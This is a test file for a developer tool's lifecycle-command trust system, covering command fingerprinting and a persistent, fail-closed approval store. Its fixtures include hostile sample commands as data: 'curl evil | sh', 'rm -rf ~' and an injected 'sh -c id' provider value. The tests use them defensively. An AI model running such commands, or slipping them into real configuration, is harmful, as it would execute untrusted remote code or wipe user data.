import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, readFile, rm, writeFile, readdir } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";
import {
  FileLifecycleCommandApprovalStore,
  fingerprintCommandGroups,
  lifecycleConfigCommandGroups,
  resolveLifecycleCommandApprovalsDir,
  resourceEnvironmentCommandGroups,
} from "../lifecycleCommandTrust.js";

function configFingerprint(config: Parameters<typeof lifecycleConfigCommandGroups>[0]): string {
  return fingerprintCommandGroups("config", lifecycleConfigCommandGroups(config));
}

describe("lifecycle command fingerprints", () => {
  const base = {
    setup: ["npm install"],
    teardown: ["docker compose down"],
    resource: {
      provision: ["terraform apply"],
      teardown: ["terraform destroy"],
      resume: ["resume"],
      pause: ["pause"],
      status: "status --json",
      connect: "ssh box",
    },
  };

  it("changes when any command field changes", () => {
    const original = configFingerprint(base);
    const variants = [
      { ...base, setup: ["npm install", "curl evil | sh"] },
      { ...base, teardown: ["rm -rf ~"] },
      { ...base, resource: { ...base.resource, provision: ["other"] } },
      { ...base, resource: { ...base.resource, teardown: ["other"] } },
      { ...base, resource: { ...base.resource, resume: ["other"] } },
      { ...base, resource: { ...base.resource, pause: ["other"] } },
      { ...base, resource: { ...base.resource, status: "other" } },
      { ...base, resource: { ...base.resource, connect: "other" } },
      // Not a command, but it reaches every command as DAINTREE_RESOURCE_PROVIDER.
      { ...base, resource: { ...base.resource, provider: "sh -c id" } },
    ];
    const fingerprints = variants.map(configFingerprint);
    for (const fingerprint of fingerprints) expect(fingerprint).not.toBe(original);
    expect(new Set(fingerprints).size).toBe(variants.length);
  });

  it("changes when commands are reordered or moved between phases", () => {
    const original = configFingerprint({ setup: ["a", "b"] });
    expect(configFingerprint({ setup: ["b", "a"] })).not.toBe(original);
    expect(configFingerprint({ teardown: ["a", "b"] })).not.toBe(original);
  });

  it("changes when a command moves between named resource environments", () => {
    expect(configFingerprint({ resources: { gpu: { provision: ["up"] } } })).not.toBe(
      configFingerprint({ resources: { cpu: { provision: ["up"] } } })
    );
  });

  it("ignores fields that never run", () => {
    const withMetadata = {
      ...base,
      resource: {
        ...base.resource,
        statusInterval: 30,
        timeouts: { provision: 10 },
      },
    };
    expect(configFingerprint(withMetadata)).toBe(configFingerprint(base));
  });

  it("treats empty command lists and empty strings as nothing to run", () => {
    expect(
      lifecycleConfigCommandGroups({ setup: [], resource: { status: "", connect: "" } })
    ).toEqual([]);
    expect(configFingerprint({ setup: [] })).toBe(configFingerprint({}));
  });

  it("keeps config and settings sources apart", () => {
    const resource = { provision: ["up"] };
    expect(
      fingerprintCommandGroups("settings", resourceEnvironmentCommandGroups({ default: resource }))
    ).not.toBe(configFingerprint({ resources: { default: resource } }));
  });

  it("labels every group so the review shows where each command runs", () => {
    expect(lifecycleConfigCommandGroups(base).map((group) => group.label)).toEqual([
      "Setup",
      "Teardown",
      "Resource provision",
      "Resource teardown",
      "Resource resume",
      "Resource pause",
      "Resource status",
      "Resource connect",
    ]);
    expect(
      resourceEnvironmentCommandGroups({ gpu: { status: "check" } }).map((group) => group.label)
    ).toEqual(['Environment "gpu" status']);
  });
});

describe("FileLifecycleCommandApprovalStore", () => {
  let dir: string;
  const fingerprint = "a".repeat(64);
  const other = "b".repeat(64);

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "daintree-approvals-"));
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it("approves nothing until told to", async () => {
    const store = new FileLifecycleCommandApprovalStore(dir);
    expect(await store.isApproved("/repo", fingerprint)).toBe(false);
  });

  it("persists approvals per project across store instances", async () => {
    await new FileLifecycleCommandApprovalStore(dir).approve("/repo", [fingerprint]);

    const fresh = new FileLifecycleCommandApprovalStore(dir);
    expect(await fresh.isApproved("/repo", fingerprint)).toBe(true);
    expect(await fresh.isApproved("/repo", other)).toBe(false);
    expect(await fresh.isApproved("/another-repo", fingerprint)).toBe(false);
  });

  it("keeps both approvals when two land at once", async () => {
    const store = new FileLifecycleCommandApprovalStore(dir);
    await Promise.all([store.approve("/repo", [fingerprint]), store.approve("/repo", [other])]);
    expect(await store.isApproved("/repo", fingerprint)).toBe(true);
    expect(await store.isApproved("/repo", other)).toBe(true);
  });

  it("fails closed on a corrupt or foreign approvals file", async () => {
    const store = new FileLifecycleCommandApprovalStore(dir);
    await store.approve("/repo", [fingerprint]);
    const [file] = await readdir(dir);

    await writeFile(join(dir, file!), "{not json");
    expect(await store.isApproved("/repo", fingerprint)).toBe(false);

    await writeFile(join(dir, file!), JSON.stringify({ version: 99, fingerprints: [fingerprint] }));
    expect(await store.isApproved("/repo", fingerprint)).toBe(false);
  });

  it("ignores entries that are not fingerprints", async () => {
    const store = new FileLifecycleCommandApprovalStore(dir);
    await store.approve("/repo", ["not-a-fingerprint", fingerprint]);
    const [file] = await readdir(dir);
    const saved = JSON.parse(await readFile(join(dir, file!), "utf-8")) as {
      fingerprints: string[];
    };
    expect(saved.fingerprints).toEqual([fingerprint]);
  });

  it("drops the oldest approvals past the cap", async () => {
    const store = new FileLifecycleCommandApprovalStore(dir);
    const many = Array.from({ length: 205 }, (_, i) => i.toString(16).padStart(64, "0"));
    await store.approve("/repo", many);
    expect(await store.isApproved("/repo", many[0]!)).toBe(false);
    expect(await store.isApproved("/repo", many[204]!)).toBe(true);
  });

  it("refuses to approve without a directory and approves nothing", async () => {
    const store = new FileLifecycleCommandApprovalStore(null);
    await expect(store.approve("/repo", [fingerprint])).rejects.toThrow();
    expect(await store.isApproved("/repo", fingerprint)).toBe(false);
  });
});

describe("resolveLifecycleCommandApprovalsDir", () => {
  it("uses an absolute userData directory", () => {
    const root = join(tmpdir(), "daintree-user-data");
    expect(resolveLifecycleCommandApprovalsDir(root)).toBe(
      join(root, "lifecycle-command-approvals")
    );
  });

  it("has no directory for a missing or relative userData path", () => {
    expect(resolveLifecycleCommandApprovalsDir(undefined)).toBeNull();
    expect(resolveLifecycleCommandApprovalsDir("relative/path")).toBeNull();
  });
});
